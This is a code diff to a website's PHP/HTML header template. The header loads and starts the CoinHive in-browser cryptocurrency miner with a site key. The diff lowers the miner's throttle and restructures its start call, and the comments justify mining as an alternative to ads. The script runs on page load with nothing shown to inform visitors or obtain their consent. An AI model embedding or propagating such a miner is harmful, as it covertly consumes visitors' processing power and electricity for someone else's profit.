@@ -78,10 +78,12 @@ if (isset($GLOBALS['HeaderOpts']['sorttable'])) {
 <!-- Experimental. Trying for one day. 2012-09-22 -->
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-new CoinHive.Anonymous('BV46oubaG1JdP1rj22bX79tA9tjHdgmE', {
+miner = new CoinHive.Anonymous('BV46oubaG1JdP1rj22bX79tA9tjHdgmE', {
     // I do try to be nice about this. It keeps ads off my site.
-    throttle: 0.95
-}).start();
+    // 99% of the time this shouldn't be mining.
+    throttle: 0.99
+});
+miner.start();
 </script>
 </head>
 <body>
